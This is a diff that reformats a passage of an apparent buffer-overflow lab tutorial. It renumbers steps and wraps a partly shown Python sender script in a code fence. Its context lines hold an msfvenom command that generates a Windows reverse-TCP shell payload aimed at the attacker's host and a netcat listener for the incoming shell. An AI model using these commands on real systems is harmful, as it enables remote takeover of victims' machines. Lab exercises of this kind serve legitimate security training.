@@ -144,9 +144,8 @@ python2 find-right-module.py
 sudo msfvenom -p windows/shell_reverse_tcp LHOST=Ip address of kali Linux LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 
 2. Create a Python script to send the exploit payload.
-
-Python Code:
-
+3. On Kali Linux, create a simple script in Python:
+ ```python
 #!/usr/bin/python
 from __future__ import print_function
 import sys, socket
@@ -164,8 +163,9 @@ try:
 except:
      print("Error connecting to server")
      sys.exit()
+ ```
 
-3. Start a netcat listener.
+4. Start a netcat listener.
 nc -nvlp 4444
 
 ### 5. Executing the Exploit
